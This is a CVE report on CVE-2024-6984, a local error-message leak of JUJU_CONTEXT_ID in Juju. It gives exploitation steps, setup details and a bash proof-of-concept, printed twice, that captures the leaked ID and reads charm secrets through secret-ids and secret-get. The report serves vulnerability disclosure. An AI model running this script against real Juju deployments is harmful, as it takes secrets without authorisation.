# CVE Report: CVE-2024-6984

## Summary
CVE-2024-6984 is a vulnerability discovered in Juju, specifically affecting versions v3.5.2 and earlier. The vulnerability falls under the category of **CWE-209**: Generation of Error Message Containing Sensitive Information. This issue allows a local unprivileged attacker to leak sensitive context IDs, which can lead to unauthorized access to sensitive data or relations accessible to the local charm.

## Root Cause of the Vulnerability
The root cause of this vulnerability lies in the overly permissive file permissions on the `/var/lib/juju/` directory, which allows unprivileged users to access sensitive information. Specifically, the error messages generated during the execution of hook tools inadvertently include the `JUJU_CONTEXT_ID`. When an unprivileged user runs a script that interacts with these tools, they can capture the context ID from the error messages, which can then be used to access sensitive data, such as secrets and configuration details.

The provided patch addresses this issue by ensuring that the `JUJU_CONTEXT_ID` is not leaked in error messages. The patch modifies the error handling in the code to prevent the context ID from being included in the output, thus mitigating the risk of exploitation.

## Exploitation Details
To exploit this vulnerability, an attacker would need to perform the following steps:

1. Create an unprivileged user on a host running Juju.
2. Execute a script that continuously attempts to call Juju's hook tools while waiting for a hook to execute. The script captures any error messages that are returned.
3. When a hook is executed, the error message may include the `JUJU_CONTEXT_ID`, which the attacker can then extract.
4. Using the leaked context ID, the attacker can make further calls to Juju's tools to access sensitive data, such as secrets and configuration information.

### Example Exploit Script
The advisory provides a proof-of-concept script that demonstrates this exploitation:

```bash
#!/usr/bin/bash

while true; do
    if [ "JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids | grep -q 'bad request: expected context id '" ]; then
        context_id=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids 2>&1 | awk -F"\"" '{print $2}')
        echo $context_id
        echo "Now get the secrets:"
        secret=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-ids | head -n 1)
        echo "Target secret is: $secret"
        value=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-get $secret)
        echo "$value"
    fi
    sleep 5s
done
```

## Environment Setup Requirements
- **Port**: The PoC uses a Unix socket, so no specific port number is applicable.
- **Target Endpoint**: The script interacts with the following paths:
  - `/var/lib/juju/tools/unit-opensearch-4/secret-ids`
  - `/var/lib/juju/tools/unit-opensearch-4/secret-get`
- **Explicit Configuration**: The script requires the following environment variables to be set:
  - `JUJU_AGENT_SOCKET_NETWORK=unix`
  - `JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket`
  - `JUJU_CONTEXT_ID` (initially set to `0` and later updated with the leaked context ID)

## Complete PoC Code
The proof-of-concept code provided in the advisory is as follows:

```bash
#!/usr/bin/bash

while true; do
    if [ "JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids | grep -q 'bad request: expected context id '" ]; then
        context_id=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids 2>&1 | awk -F"\"" '{print $2}')
        echo $context_id
        echo "Now get the secrets:"
        secret=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-ids | head -n 1)
        echo "Target secret is: $secret"
        value=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-get $secret)
        echo "$value"
    fi
    sleep 5s
done
```

This report outlines the critical aspects of CVE-2024-6984, including its nature, exploitation method, and the necessary environment setup to reproduce the vulnerability. The patch provided in the advisory effectively mitigates the risk associated with this vulnerability.